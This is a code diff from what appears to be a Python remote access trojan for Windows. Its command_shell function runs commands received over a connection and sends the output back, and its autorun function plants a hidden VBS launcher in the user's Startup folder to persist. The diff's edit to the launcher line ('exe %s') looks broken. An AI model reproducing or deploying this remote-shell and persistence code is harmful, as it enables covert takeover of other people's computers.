@@ -9,9 +9,6 @@ import sys
 import time
 import webbrowser
 import wmi
-import tqdm
-
-import win32.lib.win32con as win32con
 import win32api
 import win32event
 import winerror
@@ -122,7 +119,6 @@ def command_shell():
             if (command.stderr.read()).decode("utf-8") == "":
                 output = (command.stdout.read()).decode("utf-8").splitlines()[0]
                 os.chdir(output)
-
                 bytData = str.encode("\n" + str(os.getcwd()) + ">")
         elif len(strData) > 0:
             command = subprocess.Popen(strData, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE,
@@ -136,13 +132,13 @@ def command_shell():
         time.sleep(0.1)
         send(bytData)
 
-# TODO: change from python to exe
+
 def autorun():
     USER_NAME = getpass.getuser()
     file_path = os.path.dirname(os.path.realpath(__file__)) + "\\" + os.path.basename(os.path.realpath(__file__))
     bat_path = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' % USER_NAME
     with open(bat_path + '\\' + "open.vbs", "w+") as bat_file:
-        bat_file.write('cmd = "python %s"\n' % file_path)
+        bat_file.write('cmd = "exe %s"\n' % file_path)
         bat_file.write('Set WShShell = CreateObject("WScript.Shell")\n')
         bat_file.write('WshShell.Run cmd & Chr(34), 0\n')
         bat_file.write("Set WshShell = Nothing\n")
